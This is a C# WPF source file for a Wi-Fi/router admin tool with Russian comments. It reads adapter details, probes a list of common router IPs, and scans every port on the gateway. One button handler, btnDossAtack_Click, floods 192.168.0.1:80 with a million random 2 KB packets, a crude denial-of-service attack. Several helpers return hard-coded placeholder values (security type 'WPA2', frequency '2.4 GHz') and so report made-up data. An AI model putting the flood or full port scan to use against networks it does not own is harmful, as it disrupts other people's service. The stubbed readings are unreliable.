using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Windows;
using System.Management; 
using Plugin.MauiWifiManager;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Net.Sockets;
using System.Threading;
using System.Collections.Generic;





namespace WI_FI_Admin
{
    public partial class MainWindow : Window
    {
        private string txtRouterIP2;
        private string txtRouterIP4;
        private int port = 80; // target port
        private int threads = 100; // number of threads
        private int packets = 1000; // number of packets per thread

        private System.Timers.Timer updateTimer;



        [DllImport("ole32.dll")]
        static extern int CoWaitForMultipleHandles(uint dwFlags, uint dwTimeout, int cHandles, IntPtr[] pHandles, out uint pdwIndex);

        [DllImport("Wlanapi.dll")]
        private static extern int WlanGetAvailableNetworkList(IntPtr hClient, ref Guid pInterfaceGuid, uint dwFlags, IntPtr pReserved, out IntPtr ppAvailableNetworkList);

        [DllImport("Wlanapi.dll")]
        private static extern void WlanFreeMemory(IntPtr pMemory);

        [DllImport("Wlanapi.dll")]
        private static extern int WlanOpenHandle(uint dwClientVersion, IntPtr pReserved, out uint pdwNegotiatedVersion, out IntPtr phClientHandle);

        [DllImport("Wlanapi.dll")]
        private static extern int WlanCloseHandle(IntPtr hClientHandle, IntPtr pReserved);

        public MainWindow()
        {
            InitializeComponent();

            updateTimer = new System.Timers.Timer(500); // Обновление каждые 500 милисекунд
            updateTimer.Elapsed += UpdateRouterInfo;
            updateTimer.AutoReset = true;
            updateTimer.Enabled = true;
        }

        private async void btnFindRouter_Click(object sender, RoutedEventArgs e)
        {
            var routerInfo = await GetRouterInfoAsync();
     

            if (!string.IsNullOrEmpty(routerInfo.Item1)) // Проверяем только первый элемент
            {
                // Установка значений для текстовых блоков
                txtRouterIP.Text = routerInfo.Item1;
                txtRouterIP.ToolTip = "The IP address of the router used to access its settings.";
                txtRouterIP2 = routerInfo.Item1;



                txtSsid.Text = routerInfo.Item2;
                txtSsid.ToolTip = "The name of your wireless network.";

                txtMacAddress.Text = routerInfo.Item3;
                txtMacAddress.ToolTip = "The unique identifier of your router.";

                txtIPv4Address.Text = routerInfo.Item4;
                txtIPv4Address.ToolTip = "The address used to connect to IPv4.";
                txtRouterIP4 = routerInfo.Item4;

                txtIPv6Address.Text = routerInfo.Item5;
                txtIPv6Address.ToolTip = "The address used to connect to IPv6.";

                txtDnsServers.Text = string.Join(", ", routerInfo.Item6);
                txtDnsServers.ToolTip = "Servers used for domain name conversion.";

                txtConnectionStatus.Text = routerInfo.Item7;
                txtConnectionStatus.ToolTip = "The current status of the connection to the router.";

                txtConnectionSpeed.Text = routerInfo.Item8;
                txtConnectionSpeed.ToolTip = "The data transfer rate between your device and the router.";

                txtSecurityType.Text = routerInfo.Item9;
                txtSecurityType.ToolTip = "The type of encryption used to protect the network.";

                txtDataTransfer.Text = routerInfo.Item10;
                txtDataTransfer.ToolTip = "The amount of data transmitted over the connection.";

                txtFrequency.Text = routerInfo.Item11;
                txtFrequency.ToolTip = "The frequency at which your network operates (for example, 2.4 GHz or 5 GHz).";

                txtSsid.Text = routerInfo.Item2; // SSID роутера
                txtRouterName.Text = routerInfo.Item3; // Название роутера

                // Проверка открытого порта
                int openPort = FindOpenPort();
                txtOpenPort.Text = openPort > 0 ? $"{openPort}" : "There are no open ports.";
            }
            else
            {
                txtWifiInfo.Text = "The router was not found.";
            }
        }



        private void btnOpenRouter_Click(object sender, RoutedEventArgs e)
        {
            string routerIP = txtRouterIP.Text;
            List<string> knownRouterIPs = new List<string>
    {
        routerIP,
        "192.168.1.1",
        "192.168.0.1",
        "192.168.10.1",
        "192.168.61.1",
        "192.168.100.1",
        "192.168.1.254",
        "192.168.10.1",
        "192.168.0.50",
        "192.168.0.254",
        "192.168.88.1",
        "192.168.1.2",
        "192.168.8.1",
        "192.168.3.1",
        "192.168.123.254",
        "192.168.31.1",
        "192.168.1.250",
        "192.168.1.240",
        "10.0.0.1",
        "192.168.50.1",
        "10.10.10.254",
        "192.168.254.254",
        "192.168.10.100",
        "192.168.0.100",
        "192.168.2.2",
        "192.168.178.1",
        "192.168.15.1",
        "192.168.1.20",
        "192.168.16.1",
        "10.0.0.2",
        "192.168.190.1",
        "192.168.20.1",
        "192.168.1.253",
        "192.168.2.254",
        "192.168.0.30",
        "192.168.62.1",
        "192.168.1.252",
        "192.168.0.10",
        "192.168.18.1",
        "192.168.111.1",
        "192.168.1.100",
        "192.168.200.1",
        "10.0.1.1",
        "192.168.1.230",
        "192.168.168.168",
        "192.168.7.2",
        "192.168.100.252",
        "192.168.9.2",
        "10.0.10.254",
        "172.16.0.1",
        "169.254.128.132",
        "192.168.1.251",
        "10.90.90.91",
        "192.168.0.227",
        "192.168.1.226",
        "192.168.61.1",
        "192.168.16.254",
        "192.168.0.228",
        "192.168.0.101",
        "10.128.128.128",
        "192.168.85.1",
        "192.168.1.200",
        "10.0.0.10",
        "192.168.1.10",
        "192.168.150.1",
        "192.168.11.100",
        "192.168.30.1",
        "169.254.1.250",
        "192.168.80.240",
        "10.100.1.1",
                
        // Добавьте другие известные IP-адреса роутеров
    };

            bool foundAccessibleRouter = false; // Флаг для отслеживания доступного роутера

            foreach (var ip in knownRouterIPs)
            {
                if (IsRouterAccessible(ip))
                {
                    Process.Start(new ProcessStartInfo("cmd", $"/c start http://{ip}") { CreateNoWindow = true });
                    foundAccessibleRouter = true; // Установим флаг в true
                    break; // Выходим из цикла после открытия первого доступного IP
                }
            }

            if (!foundAccessibleRouter)
            {
                MessageBox.Show("Failed to connect to the router at known addresses.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private bool IsRouterAccessible(string ipAddress)
        {
            try
            {
                using (var ping = new Ping())
                {
                    var reply = ping.Send(ipAddress, 2000); // 2 секунды ожидания
                    return reply.Status == IPStatus.Success;
                }
            }
            catch
            {
                return false; // Если произошла ошибка, считаем, что адрес недоступен
            }
        }


        private async Task<(string, string, string, string, string, string[], string, string, string, string, string)> GetRouterInfoAsync()
        {
            var gateways = NetworkInterface.GetAllNetworkInterfaces();
            foreach (var gateway in gateways)
            {
                if (gateway.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 && gateway.OperationalStatus == OperationalStatus.Up)
                {
                    var properties = gateway.GetIPProperties();
                    var gatewayAddresses = properties.GatewayAddresses;

                    if (gatewayAddresses.Count > 0)
                    {
                        var routerIP = gatewayAddresses[0].Address.ToString();
                        var ssid = gateway.Description; // SSID может быть в описании интерфейса
                        var macAddress = gateway.GetPhysicalAddress().ToString();

                        // Получаем IPv4 и IPv6 адреса
                        var ipv4Address = properties.UnicastAddresses
                            .FirstOrDefault(ip => ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.Address.ToString() ?? "Не найден";
                        var ipv6Address = properties.UnicastAddresses
                            .FirstOrDefault(ip => ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6)?.Address.ToString() ?? "Не найден";
                       
                        // Получаем DNS-серверы
                        var dnsServers = properties.DnsAddresses.Select(dns => dns.ToString()).ToArray();

                       
                        // Статус соединения
                        var status = gateway.OperationalStatus.ToString();

                        // Получаем скорость соединения
                        var speed = gateway.Speed.ToString(); // Скорость соединения

                        // Получаем тип безопасности
                        var securityType = GetSecurityType(ssid); // Используйте синхронный метод

                        // Получение информации о передаче данных
                        var dataTransfer = GetDataTransfer(gateway);

                        // Получение частоты
                        var frequency = GetFrequency(gateway);

                        return (routerIP, ssid, macAddress, ipv4Address, ipv6Address, dnsServers, status, speed, securityType, dataTransfer, frequency);
                    }
                }
            }
            return (null, null, null, null, null, null, null, null, null, null, null);
        }


        private string GetSecurityType(string ssid)
        {
            string securityType = "Not defined";

            try
            {
                var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionStatus=2");
                foreach (ManagementObject obj in searcher.Get())
                {
                    var name = obj["Name"].ToString();
                    if (name.Contains(ssid))
                    {
                        // Здесь вы можете добавить логику для определения типа безопасности
                        securityType = "WPA2"; // Пример, замените на правильное получение типа безопасности
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                securityType = "Error: " + ex.Message;
            }

            return securityType;
        }




        private string GetDataTransfer(NetworkInterface gateway)
        {
            var stats = gateway.GetIPv4Statistics();
            return $"Sent: {stats.BytesSent} byte, Received:{stats.BytesReceived} byte";
        }

        public string GetFrequency(NetworkInterface gateway)
        {
            string frequency = "Not defined";
            IntPtr clientHandle = IntPtr.Zero;
            uint negotiatedVersion;

            try
            {
                // Открываем соединение с WLAN API
                int result = WlanOpenHandle(2, IntPtr.Zero, out negotiatedVersion, out clientHandle);
                if (result != 0)
                {
                    return "Error opening the WLAN API";
                }

                // Получаем список доступных сетей
                Guid interfaceGuid = GetInterfaceGuid(gateway);
                IntPtr availableNetworkListPtr;
                result = WlanGetAvailableNetworkList(clientHandle, ref interfaceGuid, 0, IntPtr.Zero, out availableNetworkListPtr);

                if (result == 0)
                {
                    // Здесь вы можете обработать список сетей и получить частоту
                    // Для этого вам нужно будет проанализировать данные из availableNetworkListPtr
                    // Это может потребовать дополнительной работы с Marshal для получения данных

                    // Пример: если вы нашли нужную сеть, вы можете получить ее частоту
                    frequency = "2.4 GHz"; // Замените на реальную логику
                }
            }
            catch (Exception ex)
            {
                frequency = "Error: " + ex.Message;
            }
            finally
            {
                if (clientHandle != IntPtr.Zero)
                {
                    WlanCloseHandle(clientHandle, IntPtr.Zero);
                }
            }

            return frequency;
        }

        private Guid GetInterfaceGuid(NetworkInterface gateway)
        {
           
            return Guid.NewGuid(); 
        }

        private void btnDossAtack_Click(object sender, EventArgs e)
        {
            // Define the target IP address and port number
            string targetIP = "192.168.0.1";
            int targetPort = 80;

            // Create a new socket object
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            try
            {
                // Connect to the target IP address and port number
                sock.Connect(new IPEndPoint(IPAddress.Parse(targetIP), targetPort));

                // Send a large number of packets to the target IP address and port number
                for (int i = 0; i < 1000000; i++)
                {
                    // Create a new byte array to hold the packet data
                    byte[] packetData = new byte[2048];

                    // Fill the packet data with random bytes
                    Random rand = new Random();
                    rand.NextBytes(packetData);

                    // Send the packet to the target IP address and port number
                    sock.Send(packetData);
                }

                // Close the socket object
                sock.Close();
            }
            catch (SocketException ex)
            {
                // Handle the SocketException
                if (ex.SocketErrorCode == SocketError.ConnectionReset)
                {
                    // Reconnect to the remote host
                    sock.Close();
                    sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sock.Connect(new IPEndPoint(IPAddress.Parse(targetIP), targetPort));
                }
                else
                {
                    // Handle other SocketException errors
                }
            }
        }

        private async void UpdateRouterInfo(object sender, System.Timers.ElapsedEventArgs e)
        {
            try
            {
                var routerInfo = await GetRouterInfoAsync();

                // Обновление UI в главном потоке
                Application.Current.Dispatcher.Invoke(() =>
                {
                    if (!string.IsNullOrEmpty(routerInfo.Item1))
                    {
                        txtConnectionStatus.Text = routerInfo.Item7;
                        txtConnectionSpeed.Text = routerInfo.Item8;
                        txtDataTransfer.Text = routerInfo.Item10;
                       
                    }
                });
            }
            catch (TaskCanceledException)
            {
                // Обработка отмены задачи
                Dispatcher.Invoke(() =>
                {
                    txtWifiInfo.Text = "The task was canceled.";
                });
            }
            catch (Exception ex)
            {
                // Обработка других исключений
                Dispatcher.Invoke(() =>
                {
                    txtWifiInfo.Text = $"Mistake: {ex.Message}";
                });
            }
        }
        private int FindOpenPort()
        {
            for (int port = 1; port <= 65535; port++)
            {
                try
                {
                    using (var client = new TcpClient())
                    {
                        var result = client.BeginConnect(txtRouterIP2, port, null, null);
                        bool success = result.AsyncWaitHandle.WaitOne(100); 
                        if (success && client.Connected)
                        {
                            client.EndConnect(result);
                            return port; 
                        }
                    }
                }
                catch
                {
                    
                }
            }
            return -1; 
        }

   


    }
}

